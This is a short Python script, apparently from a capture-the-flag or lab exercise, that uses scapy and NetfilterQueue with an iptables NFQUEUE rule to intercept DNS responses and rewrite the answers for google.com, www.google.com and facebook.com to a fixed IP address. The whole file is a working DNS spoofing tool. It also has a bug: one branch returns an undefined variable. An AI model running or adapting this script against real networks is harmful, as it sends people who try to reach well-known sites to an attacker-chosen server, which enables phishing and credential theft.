from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    print("================================start action===========================")
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(scapy_packet):
    # scapy_packet[Raw].load = scapy_packet[Raw].load.replace(b'flag', b'Helo') 
   
    qname = scapy_packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum
    return scapy_packet

if __name__=='__main__':
    dns_hosts = {
    b"www.google.com.": "192.176.45.101",
    b"google.com.": "192.176.45.101",
    b"facebook.com.": "192.176.45.101"
    }
    try:
        if os.geteuid() != 0:
            exit("Run with root permission!")
        os.system('iptables -A INPUT -j NFQUEUE --queue-num 0')
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system('iptables -D INPUT -j NFQUEUE --queue-num 0')